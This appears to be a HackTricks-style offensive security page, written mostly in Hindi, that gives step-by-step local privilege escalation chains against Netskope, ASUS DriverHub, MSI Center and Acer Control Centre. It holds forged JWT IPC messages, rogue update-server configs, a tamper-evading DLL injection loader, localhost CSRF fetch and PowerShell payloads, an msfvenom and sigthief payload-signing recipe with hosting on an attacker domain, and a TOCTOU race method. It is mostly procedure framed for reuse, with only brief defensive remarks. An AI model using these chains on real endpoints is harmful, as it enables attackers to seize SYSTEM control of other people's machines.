# एंटरप्राइज़ Auto-Updaters और Privileged IPC का दुरुपयोग (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

यह पृष्ठ उन Windows local privilege escalation चेन की एक श्रेणी को सामान्यीकृत करता है जो एंटरप्राइज़ endpoint agents और updaters में पाई जाती हैं और जो एक low\-friction IPC surface और एक privileged update flow एक्सपोज़ करती हैं। एक प्रतिनिधि उदाहरण Netskope Client for Windows < R129 (CVE-2025-0309) है, जहाँ एक low\-privileged उपयोगकर्ता attacker\-controlled सर्वर में enrollment को मजबूर कर सकता है और फिर एक malicious MSI डिलिवर कर सकता है जिसे SYSTEM सेवा इंस्टॉल करती है।

Key ideas you can reuse against similar products:
- privileged service’s localhost IPC का दुरुपयोग करके re\-enrollment या reconfiguration को attacker सर्वर की ओर मजबूर करें।
- vendor के update endpoints को इम्प्लिमेंट करें, एक rogue Trusted Root CA डिलिवर करें, और updater को एक malicious, “signed” package की ओर पॉइंट करें।
- कमजोर signer checks (CN allow\-lists), optional digest flags, और lax MSI properties से बचें।
- यदि IPC “encrypted” है, तो registry में स्टोर world\-readable machine identifiers से key/IV निकाले।
- यदि सेवा callers को image path/process name से restrict करती है, तो किसी allow\-listed process में inject करें या एक suspended प्रक्रिया spawn करके minimal thread\-context patch के जरिए अपनी DLL bootstrap करें।

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Many agents ship a user\-mode UI process that talks to a SYSTEM service over localhost TCP using JSON.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) एक JWT enrollment token तैयार करें जिसके claims backend host (उदा., AddonUrl) को नियंत्रित करते हों। Use alg=None ताकि किसी signature की आवश्यकता न हो।
2) अपनी JWT और tenant name के साथ provisioning command को invoke करते हुए IPC message भेजें:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) सेवा enrollment/config के लिए आपके rogue server से संपर्क करना शुरू कर देती है, उदाहरण के लिए:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- यदि caller verification path/name\-based है, अनुरोध allow\-listed vendor binary से originate करें (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Once the client talks to your server, implement the expected endpoints and steer it to an attacker MSI. Typical sequence:

1) /v2/config/org/clientconfig → बहुत छोटे updater अंतराल के साथ JSON config लौटाएँ, उदाहरण:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → एक PEM CA certificate लौटाएं। सेवा इसे Local Machine Trusted Root store में इंस्टॉल कर देती है।
3) /v2/checkupdate → ऐसा metadata दें जो एक malicious MSI और एक fake version की ओर इशारा करे।

Bypassing common checks seen in the wild:
- Signer CN allow\-list: सेवा संभवतः केवल यह जांच सकती है कि Subject CN “netSkope Inc” या “Netskope, Inc.” के बराबर है। आपकी rogue CA उस CN के साथ एक leaf जारी कर सकती है और MSI पर साइन कर सकती है।
- CERT_DIGEST property: एक benign MSI property शामिल करें जिसका नाम CERT_DIGEST हो। इंस्टॉल के समय कोई enforcement नहीं।
- Optional digest enforcement: config flag (उदा., check_msi_digest=false) अतिरिक्त cryptographic validation को disable कर देता है।

Result: SYSTEM सेवा आपकी MSI को
C:\ProgramData\Netskope\stAgent\data\*.msi
से इंस्टॉल करती है और NT AUTHORITY\SYSTEM के रूप में arbitrary code execute करती है।

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope ने IPC JSON को एक encryptData field में wrap किया जो Base64 जैसा दिखता है। Reversing से पता चला कि AES का key/IV उन registry values से derive होता है जिन्हें कोई भी user पढ़ सकता है:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers encryption को reproduce कर सकते हैं और एक standard user से valid encrypted commands भेज सकते हैं। सामान्य टिप: अगर कोई agent अचानक अपने IPC को “encrypt” करता है, तो HKLM में device IDs, product GUIDs, install IDs जैसे material ढूँढें।

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

कुछ services peer को authenticate करने के लिए TCP connection के PID को resolve करके image path/name की तुलना allow\-listed vendor binaries से करते हैं जो Program Files के अंतर्गत होते हैं (उदा., stagentui.exe, bwansvc.exe, epdlp.exe)।

Two practical bypasses:
- DLL injection into an allow\-listed process (e.g., nsdiag.exe) करके अंदर से IPC को proxy करना।
- एक allow\-listed binary को suspended रूप में spawn करें और CreateRemoteThread का उपयोग किए बिना अपना proxy DLL bootstrap करें (देखें §5) ताकि driver\-enforced tamper नियम पूरे हों।

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Products अक्सर एक minifilter/OB callbacks driver (उदा., Stadrv) के साथ आते हैं जो protected processes के handles से dangerous rights हटा देता है:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME हटाता है
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE तक सीमित करता है

एक reliable user\-mode loader जो इन constraints का सम्मान करता है:
1) CreateProcess किसी vendor binary का CREATE_SUSPENDED के साथ करें।
2) वे handles प्राप्त करें जो अभी भी allowed हैं: process पर PROCESS_VM_WRITE | PROCESS_VM_OPERATION, और thread handle THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (या अगर आप एक known RIP पर code patch कर रहे हैं तो सिर्फ THREAD_RESUME)।
3) ntdll!NtContinue (या कोई अन्य early, guaranteed\-mapped thunk) को overwrite करें एक छोटे stub से जो आपके DLL path पर LoadLibraryW कॉल करे, फिर वापस jump करे।
4) ResumeThread करें ताकि आपका stub in\-process trigger हो और आपकी DLL लोड हो।

क्योंकि आपने पहले से protected process पर PROCESS_CREATE_THREAD या PROCESS_SUSPEND_RESUME का उपयोग नहीं किया (आपने उसे बनाया था), driver की policy संतुष्ट होती है।

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) एक rogue CA, malicious MSI signing automate करता है, और जरूरी endpoints सर्व करता है: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate।
- UpSkope एक custom IPC client है जो arbitrary (optionally AES\-encrypted) IPC messages craft करता है और suspended\-process injection शामिल करता है ताकि request एक allow\-listed binary से originate हो।

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub एक user\-mode HTTP service (ADU.exe) 127.0.0.1:53000 पर चलाता है जो browser calls की उम्मीद करता है जो https://driverhub.asus.com से आ रहे हों। Origin filter बस Origin header और `/asus/v1.0/*` से expose हुए download URLs पर `string_contains(".asus.com")` करता है। इसलिए कोई भी attacker\-controlled host जैसे `https://driverhub.asus.com.attacker.tld` इस चेक को पास कर लेना और JavaScript से state\-changing requests भेजना संभव बना देता है। अतिरिक्त bypass patterns के लिए देखें [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)।

Practical flow:
1) ऐसा domain register करें जिसमें `.asus.com` embed हो और वहाँ एक malicious webpage होस्ट करें।
2) `fetch` या XHR का उपयोग करके privileged endpoint (उदा., `Reboot`, `UpdateApp`) पर `http://127.0.0.1:53000` कॉल करें।
3) handler द्वारा अपेक्षित JSON body भेजें – packed frontend JS नीचे schema दिखाता है।
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
नीचे दिखाया गया PowerShell CLI भी तब सफल होता है जब Origin header को विश्वसनीय मान में spoofed किया जाता है:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1\-click (or 0\-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON बॉडी में परिभाषित arbitrary executables डाउनलोड करता है और उन्हें `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` में कैश करता है। Download URL validation वही substring लॉजिक reuse करती है, इसलिए `http://updates.asus.com.attacker.tld:8000/payload.exe` स्वीकार किया जाता है। डाउनलोड के बाद, ADU.exe केवल यह चेक करता है कि PE में एक सिग्नेचर मौजूद है और Subject string ASUS से मेल खाती है, उसके बाद ही इसे चलाता है – कोई `WinVerifyTrust`, कोई chain validation नहीं।

To weaponize the flow:
1) एक payload बनाएँ (उदा., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`)।
2) ASUS के signer को उसमें क्लोन करें (उदा., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`)।
3) `pwn.exe` को किसी `.asus.com` दिखने वाले डोमेन पर होस्ट करें और ऊपर दिए गए ब्राउज़र CSRF के ज़रिए UpdateApp ट्रिगर करें।

क्योंकि दोनों Origin और URL फिल्टर्स substring\-आधारित हैं और signer चेक केवल strings की तुलना करता है, DriverHub हमलावर বাইनरी को उसके elevated context में खींचता और execute कर देता है।

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center की SYSTEM सेवा एक TCP प्रोटोकॉल expose करती है जहाँ प्रत्येक frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` होता है। कोर कंपोनेंट (Component ID `0f 27 00 00`) के साथ `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` शिप होता है। इसका handler:
1) सप्लाई किए गए executable को `C:\Windows\Temp\MSI Center SDK.exe` में कॉपी करता है।
2) `CS_CommonAPI.EX_CA::Verify` के माध्यम से signature verify करता है (certificate subject “MICRO-STAR INTERNATIONAL CO., LTD.” के बराबर होना चाहिए और `WinVerifyTrust` सफल होना चाहिए)।
3) एक scheduled task बनाता है जो temp फ़ाइल को SYSTEM के रूप में attacker\-controlled arguments के साथ चलाता है।

कॉपी की गई फ़ाइल verification और `ExecuteTask()` के बीच लॉक नहीं होती। एक attacker कर सकता है:
- एक Frame A भेजे जो एक legitimate MSI-signed binary की ओर इशारा करता है (जिससे signature check पास होता है और task queued हो जाता है)।
- इसे बार-बार Frame B संदेशों के साथ रेस करे जो एक malicious payload की ओर इशारा करते हैं, verification पूरा होने के ठीक बाद `MSI Center SDK.exe` को ओवरराइट कर दें।

जब scheduler ट्रिगर होता है, तो यह ओवरराइट किए गए payload को SYSTEM के तहत execute कर देता है भले ही उसने original फ़ाइल को validate किया था। भरोसेमंद एक्सप्लॉइटेशन के लिए दो goroutines/threads का उपयोग किया जाता है जो CMD_AutoUpdateSDK को स्पैम करते हैं जब तक TOCTOU विंडो जीत नहीं जाती।

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- हर plugin/DLL जो `MSI.CentralServer.exe` द्वारा लोड होती है उसे एक Component ID मिलता है जो `HKLM\SOFTWARE\MSI\MSI_CentralServer` के अंतर्गत संग्रहीत होता है। एक frame के पहले 4 bytes उस कंपोनेंट का चयन करते हैं, जिससे attackers arbitrary modules को commands रूट कर सकते हैं।
- Plugins अपने task runners परिभाषित कर सकते हैं। `Support\API_Support.dll` `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` एक्सपोज़ करता है और सीधे `API_Support.EX_Task::ExecuteTask()` को कॉल करता है जिसमें **कोई signature validation नहीं** है – कोई भी local user इसे `C:\Users\<user>\Desktop\payload.exe` की ओर पॉइंट करके deterministic रूप से SYSTEM execution पा सकता है।
- loopback को Wireshark से sniff करने या dnSpy में .NET बाइनरीज़ को instrument करने से जल्दी ही Component ↔ command मैपिंग साफ़ हो जाती है; कस्टम Go/ Python क्लाइंट्स फिर उन frames को replay कर सकते हैं।

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) `\\.\pipe\treadstone_service_LightMode` एक्सपोज़ करता है, और इसकी discretionary ACL रिमोट क्लाइंट्स को अनुमति देती है (उदा., `\\TARGET\pipe\treadstone_service_LightMode`)। command ID `7` और एक file path भेजने पर सर्विस का process-spawning रूटीन इनवोक होता है।
- क्लाइंट लाइब्रेरी एक magic terminator byte (113) को args के साथ serialize करती है। Frida/`TsDotNetLib` के साथ डायनामिक instrumentation (इंस्ट्रुमेंटेशन टिप्स के लिए [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) देखें) से पता चलता है कि native handler इस value को `SECURITY_IMPERSONATION_LEVEL` और integrity SID में मैप करता है, उसके बाद `CreateProcessAsUser` को कॉल करता है।
- 113 (`0x71`) को 114 (`0x72`) से swap करने पर यह generic branch में चला जाता है जो पूरा SYSTEM token रखता है और high-integrity SID (`S-1-16-12288`) सेट कर देता है। इसलिए spawned binary unrestricted SYSTEM के रूप में चलता है, स्थानीय और cross-machine दोनों पर।
- इसे exposed installer flag (`Setup.exe -nocheck`) के साथ मिलाकर आप ACC को लैब VMs पर भी खड़ा कर सकते हैं और vendor hardware के बिना pipe का अभ्यास कर सकते हैं।

ये IPC बग्स दिखाते हैं कि localhost सेवाओं को mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) लागू करनी चाहिए और क्यों हर मॉड्यूल का “run arbitrary binary” helper वही signer verifications साझा करना चाहिए।

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
